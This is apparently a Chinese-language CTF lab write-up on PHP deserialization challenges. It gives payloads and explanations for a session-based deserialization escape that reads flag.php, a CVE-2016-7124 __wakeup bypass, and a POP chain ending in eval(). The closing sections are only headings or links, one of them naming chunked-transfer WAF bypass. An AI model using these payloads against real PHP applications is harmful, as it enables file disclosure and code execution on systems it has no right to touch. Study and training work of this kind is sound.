# 反序列化靶场



# 01

### 反序列化

### payload

```
?flag=s:5:"admin"
```

### 解析

执行代码输出反序列化结果

```php
echo serialize("admin");
```



解释一下



# 02

### 反序列化逃逸

### payload1

URL

```
?img_path=1&f=show
```

POST

```
_SESSION[user]=flagflagflagflagflag
&_SESSION[func]=a";s:3:"img";s:12:"ZmxhZy5waHA=";s:1:"a";s:1:"a";}
```

### payload2

URL

```
?img_path=1&f=show
```

POST

```
_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:12:"ZmxhZy5waHA=";}
```

### 解析

这道题目改编19年安洵杯的反序列化题的

很标准的反序列化逃逸

考点是变量覆盖和preg_replace造成的反序列化逃逸以及任意文件读取



# 03
### 使用CVE-2016-7124绕过_wake  private、protected修饰时的格式问题

**漏洞影响版本：**
php5 < 5.6.25
php7 < 7.0.10

payload

```
?file=O%3A4%3A%22Demo%22%3A2%3A%7Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A8%3A%22flag.php%22%3B%7D
```

解析		

直接构建类 url编码构造出两个%00  str_replace 是将 里面1 替换成2  （就是利用CVE-2016-7124 。当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，我们这里只需要搞一个大于1的数字就好了

```
class Demo
{
    protected $file = 'flag.php';
}

echo urlencode(str_replace('":1:','":2:',serialize(new Demo())));
```



这里不知道有没有小伙伴注意到，如果你不编码，直接输出，这里输出的应该是

```php
O:4:"Demo":2:{s:7:"*file";s:8:"flag.php";}
```

数组key的部分是s:7:"*file"      为什么这里有只有五个字符，s的长度却是7呢

原因是这样的

private属性序列化的时候，格式是%00类名%00成员名
protect属性序列化的时候，格式是%00*%00成员名 

这里的这个部分是 

```php
protected $file = 'index.php';
```

所以实际是

```
O:4:"Demo":2:{s:7:"%00*%00file";s:8:"flag.php";}
```



# 04

### 同名函数

```php
<?php

  class A{
  var $target;
  function __construct(){
    $this->target=new C;
    $this->target->test='phpinfo';
  }
  function __destruct(){
    $this->target->action();
  }
}
class C{
  var $test;
  function action(){
    echo "action C";
    eval($this->test);
  }
 }
$a=new A;
echo serialize($a);#O:1:"A":1:{s:6:"target";O:1:"C":1:{s:4:"test";s:10:"phpinfo();";}}
```



payload

```
?test=O:1:"A":1:{s:6:"target";O:1:"C":1:{s:4:"test";s:8:"flag.php";}}
```



构建的函数

```php
class A
{
    public $target;

    function __construct()
    {
        $this->target = new C;
        $this->target->test = "flag.php";
    }

    function __destruct()
    {
        $this->target->action();
    }
}

class C
{
    public $test;

    function action()
    {
        echo "action C";
        eval($this->test);
    }
}

echo serialize(new A);
```



# 05

PHP Session反序列化漏洞

https://xz.aliyun.com/t/6640

https://blog.csdn.net/m0_37421065/article/details/78930935

https://www.php.net/manual/zh/session.configuration.php



## 06

phar反序列化漏洞

## 07

2020 网鼎杯 areuserialz

## 08



分块传输绕waf
